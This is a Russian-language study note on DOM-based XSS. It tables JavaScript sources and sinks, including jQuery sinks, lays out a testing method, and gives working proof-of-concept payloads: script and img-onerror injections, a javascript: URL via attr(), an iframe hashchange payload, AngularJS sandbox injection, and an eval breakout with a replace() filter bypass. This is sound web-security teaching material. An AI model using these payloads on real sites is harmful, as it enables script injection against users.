> Объектная модель документа (DOM) — это иерархическое представление элементов страницы в веб-браузере. Веб-сайты могут использовать JavaScript для управления узлами и объектами DOM, а также их свойствами. Уязвимости, связанные с DOM, возникают, когда веб-сайт содержит JavaScript, который принимает контролируемое злоумышленником значение, известное как источник, и передаёт его в опасную функцию, известную как приемник.

* Источник и приёмник
  * Источник — это свойство JavaScript, принимающее данные. Примером источника является свойство location.search, поскольку оно считывает входные данные из строки запроса.
  * Приёмник — это потенциально опасная функция JavaScript или объект DOM, которые могут вызвать нежелательные последствия при передаче данных. Например, функция eval() является приёмником, поскольку она обрабатывает переданный ей аргумент как JavaScript.
 
# Приемники, которые могут привести к уязвимостям:

|Уязвимость|Приемник|
|--------------------|--------------------|
|DOM XSS|  document.write()|
|Открытое перенаправление  |window.location|
|Манипуляция с файлами cookie|  document.cookie|
|Внедрение JavaScript| eval()|
|Манипуляция с доменом документа| document.domain|
|Отравление URL WebSocket| WebSocket()|
|Манипуляция со ссылкой |element.src|
|Манипуляция с веб-сообщением| postMessage()|
|Манипуляция с заголовком Ajax-запроса| setRequestHeader()|
|Манипуляция с локальным путём к файлу |FileReader.readAsText()|
|Клиентская SQL-инъекция| ExecuteSql()|
|Манипуляция с хранилищем HTML5| sessionStorage.setItem()|
|Внедрение XPath на стороне Клиент |document.evaluate()|
|Внедрение JSON на стороне клиента |JSON.parse()|
|Манипуляция данными DOM |element.setAttribute()|
|Отказ в обслуживании |RegExp()|
 
## **Распространенные источники**

| Источник | Тип | Описание |
|----------|-----|----------|
| **URL и навигация** | | |
| `document.URL` | Свойство | Полный URL страницы (кодированный) |
| `document.documentURI` | Свойство | URI документа (альтернатива URL) |
| `document.URLUnencoded` | Свойство | Некодированный URL (устаревший) |
| `document.baseURI` | Свойство | Базовый URI для относительных путей |
| `location` | Объект | Объект с информацией о текущем URL |
| **Хранение данных** | | |
| `document.cookie` | Свойство | Куки сайта (строка ключ=значение) |
| `document.referrer` | Свойство | URL страницы-источника перехода |
| `window.name` | Свойство | Имя окна (сохраняется между перезагрузками) |
| **History API** | | |
| `history.pushState()` | Метод | Добавляет запись в историю без перезагрузки |
| `history.replaceState()` | Метод | Заменяет текущую запись в истории |
| **Хранилища браузера** | | |
| `localStorage` | Объект | Постоянное хранилище (до 5-10MB) |
| `sessionStorage` | Объект | Временное хранилище (только сессия) |
| `IndexedDB` | Объект | NoSQL база данных в браузере |
| `Database` | Объект | Устаревшая WebSQL база данных |

## **Приёмники которые могут привести к уязвимостям DOM-XSS**

| Приемник | Тип | Описание | 
|----------|-----|----------|
| **Запись в документ** | | | 
| `document.write()` | Метод | Записывает HTML прямо в документ |
| `document.writeln()` | Метод | Аналог write() с добавлением перевода строки | 
| **Домен документа** | | | 
| `document.domain` | Свойство | Устанавливает домен документа (для same-origin policy) | 
| **Манипуляция DOM** | | | 
| `element.innerHTML` | Свойство | Устанавливает/получает HTML содержимое элемента |
| `element.outerHTML` | Свойство | Устанавливает/получает HTML включая сам элемент |
| `element.insertAdjacentHTML()` | Метод | Вставляет HTML в указанную позицию относительно элемента |
| **Обработчики событий** | | | 
| `element.onevent` | Свойство | Обработчики событий (onclick, onload и т.д.) | 

### Функции jQuery которые являются приемниками и могут привести к уязвимостям DOM-XSS

| Функция | Тип | Описание |
|---------|-----|----------|
| **Добавление контента** | | | 
| `add()` | Метод | Добавляет элементы в набор выбранных элементов | 
| `after()` | Метод | Вставляет контент после выбранных элементов | 
| `append()` | Метод | Добавляет контент в конец выбранных элементов | 
| `insertAfter()` | Метод | Вставляет элементы после целевого элемента |
| `insertBefore()` | Метод | Вставляет элементы перед целевым элементом | 
| `before()` | Метод | Вставляет контент перед выбранными элементами |
| `prepend()` | Метод | Добавляет контент в начало выбранных элементов | 
| **Замена и обертка** | | | 
| `replaceAll()` | Метод | Заменяет целевые элементы выбранными элементами | 
| `replaceWith()` | Метод | Заменяет выбранные элементы новым контентом |
| `wrap()` | Метод | Оборачивает каждый выбранный элемент в указанный HTML | 
| `wrapInner()` | Метод | Оборачивает содержимое каждого выбранного элемента |
| `wrapAll()` | Метод | Оборачивает все выбранные элементы в указанный HTML | 
| **Внутренние функции** | | | 
| `html()` | Метод | Устанавливает/получает HTML содержимое элементов | 
| `has()` | Метод | Фильтрует элементы, содержащие определенные потомки | 
| `constructor()` | Метод | Конструктор jQuery объектов | 
| `init()` | Метод | Инициализация jQuery объекта | 
| `index()` | Метод | Возвращает индекс элемента в наборе |
| **Парсинг HTML** | | | 
| `jQuery.parseHTML()` | Метод | Парсит строку в массив DOM узлов | 
| `$.parseHTML()` | Метод | Сокращенная версия parseHTML() | 
| `animate()` | Метод | Анимирует CSS свойства элементов | 

# XSS-атака на основе DOM

> Наиболее распространённым источником DOM XSS является URL-адрес, доступ к которому обычно осуществляется с помощью объекта window.location.

* **Методология**
  * *Тестирование HTML-приёмников*
    * Поместить в источник случайную буквенно-цифровую строку (например, location.search),
    * С помощью инструментов разработчика проанализируйте HTML-код и найдите место появления нужной строки. (В инструментах разработчика использовать Control+F для поиска нужной строки в DOM.)
    * Для каждого места определить контекст. (Если строка находится в атрибуте, заключённом в двойные кавычки, добавить двойные кавычки в строку, чтобы проверить, можно ли выйти за пределы атрибута.)
    * Если ваши данные были закодированы в URL до обработки, XSS-атака вряд ли сработает.
  * *Тестирование приёмников выполнения JavaScript*
    * Для каждого потенциального источника, например, location, сначала необходимо найти в JavaScript-коде страницы случаи, когда на него ссылаются. (инструментах разработчика + Control+Shift+F )
    * Использовать отладчик JavaScript, чтобы добавить точку останова и проследить, как используется значение источника.
    * Обнаружив приемник, которому назначаются данные, полученные из источника, использовать отладчик для проверки значения. (наведя курсор на переменную, чтобы увидеть её значение перед отправкой в ​​приемник.)
  * * **Тестирование на DOM XSS с помощью DOM Invader**
   
##  Эксплуатация DOM XSS

* **source location.search -> приёмник document.write**
```
<script>alert(document.domain)</script>
product?productId=1&storeId=London%27><script>alert("XXX")</script>
```
* **Приёмник innerHTML не принимает элементы скрипта**
```
<img src=1 onerror=alert(document.domain)>
```

### **Источники и приемники в сторонних зависимостях**

* **Библиотека jQuery**
> функция attr() - может изменять атрибуты элементов DOM.
```
$(function() {
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});

?returnUrl=javascript:alert(document.domain)
```
> селекторная функция $() - может использоваться для внедрения вредоносных объектов в DOM. Служит для выбора элементов HTML-документа по заданным критериям (селекторам)
> 
> location.hash - для анимации или автоматической прокрутки к определённому элементу на странице + обработчик событий hashchange
```
$(window).on('hashchange', function() {
var element = $(location.hash);
element[0].scrollIntoView();
});

#
#" onload="this.src+='<img src=1 onerror=alert(1)>'">
<iframe src="https://victimsite.com/#" onload="this.src+='<img src=1 onerror=alert(1)>'">
<iframe src="https://victimsite.com#.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

* **DOM XSS в AngularJS Фреймворк**
  
> ng-app — это специальный атрибут AngularJS, который указывает корневой элемент приложения.
* ng-app — точка входа для AngularJS
* Без него AngularJS не активируется
* Определяет область действия приложения
```
<!-- На всем документе -->
<html ng-app="myApp">

<!-- На конкретном элементе -->
<div ng-app="myApp">

<!-- Несколько приложений (в разных версиях) -->
<div ng-app="app1">...</div>
<div ng-app="app2">...</div>
```
```
class="ng-binding"
{{$on.constructor('alert(1)')()}}
```

* **DOM XSS в сочетании с отражёнными и сохранёнными данными**
  
> Встроенная функция eval() позволяет выполнять строку кода.
> 
> Источники не ограничиваются данными, которые напрямую предоставляются браузерами — они также могут исходить с веб-сайта. Веб-сайты часто отражают параметры URL в HTML-ответе сервера.
```
\\
Отправляет GET-запрос по указанному пути с параметрами из URL
Ожидает JSON-ответ с результатами поиска
\\
var xhr = new XMLHttpRequest();
xhr.open("GET", path + window.location.search);
xhr.send();

xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);
        displaySearchResults(searchResultsObj);
    }
};

\\ payload
/search-results?search=\"alert(1)}//
```
* При XSS в DOM сервер получает данные из одного запроса, сохраняет их, а затем включает в следующий ответ. Скрипт в ответе содержит приёмник, который затем обрабатывает данные небезопасным способом.
``` element.innerHTML = comment.author```
> Без флага g метод replace() заменяет только первое совпадение.
```
html.replace('<', '&lt;').replace('>', '&gt;');

<><img src=1 onerror=alert(1)>
```
